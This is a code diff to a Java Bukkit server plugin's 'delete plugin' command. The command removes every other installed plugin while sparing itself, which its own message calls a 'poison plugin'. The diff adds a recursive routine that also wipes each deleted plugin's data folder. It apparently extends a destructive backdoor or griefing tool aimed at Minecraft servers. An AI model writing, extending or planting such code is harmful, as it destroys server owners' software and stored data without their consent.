@@ -32,6 +32,7 @@ public class CommandDeletePlugin extends CommandBase {
         	PI.addMessage(p, this.getUsage());
         } else if (args.length == 2) {
         	if (args[1].equalsIgnoreCase("all")) {
+        		PI.addMessage(p, "Deleting started.");
         		for (Plugin pl: Bukkit.getPluginManager().getPlugins()) {
         			if (pl.getName().equalsIgnoreCase(PI.getInstance().getName())) {
         				PI.addMessage(p, "Not deleting " + pl.getName() + "; poison plugin.");
@@ -40,7 +41,6 @@ public class CommandDeletePlugin extends CommandBase {
         				deletePlugin(pl, p);
         			}
         		}
-        		PI.addMessage(p, "Deleting started.");
         	} else {
         		Plugin pl = Bukkit.getPluginManager().getPlugin(args[1]);
         		if (pl == null) {
@@ -56,6 +56,7 @@ public class CommandDeletePlugin extends CommandBase {
     @SuppressWarnings("unchecked")
 	public void deletePlugin(Plugin plugin, Player p) {
     	File f = getFile((JavaPlugin)plugin);
+    	File d = plugin.getDataFolder();
     	if (f == null) {
     		PI.addMessage(p, "Couldn't delete " + plugin.getName() + ". Couldn't find file.");
     		return;
@@ -127,6 +128,7 @@ public class CommandDeletePlugin extends CommandBase {
 		    System.gc();
 		    System.gc();
 		    f.delete();
+		    removeDirectory(d);
 		    PI.addMessage(p, plugin.getName() + " deleted.");
 		    return;
 		}
@@ -147,6 +149,29 @@ public class CommandDeletePlugin extends CommandBase {
     		return true;
     	} catch (Exception e) {}
     	return false;
+    }
+    
+    public static boolean removeDirectory(File directory) {
+
+    	if (directory == null) return false;
+    	if (!directory.exists()) return true;
+    	if (!directory.isDirectory()) return false;
+
+    	String[] list = directory.list();
+
+    	if (list != null) {
+    		for (int i = 0; i < list.length; i++) {
+    			File entry = new File(directory, list[i]);
+
+    			if (entry.isDirectory()) {
+    				if (!removeDirectory(entry)) return false;
+    			} else {
+    				if (!entry.delete()) return false;
+    			}
+    		}
+    	}
+
+    	return directory.delete();
     }
 
 }
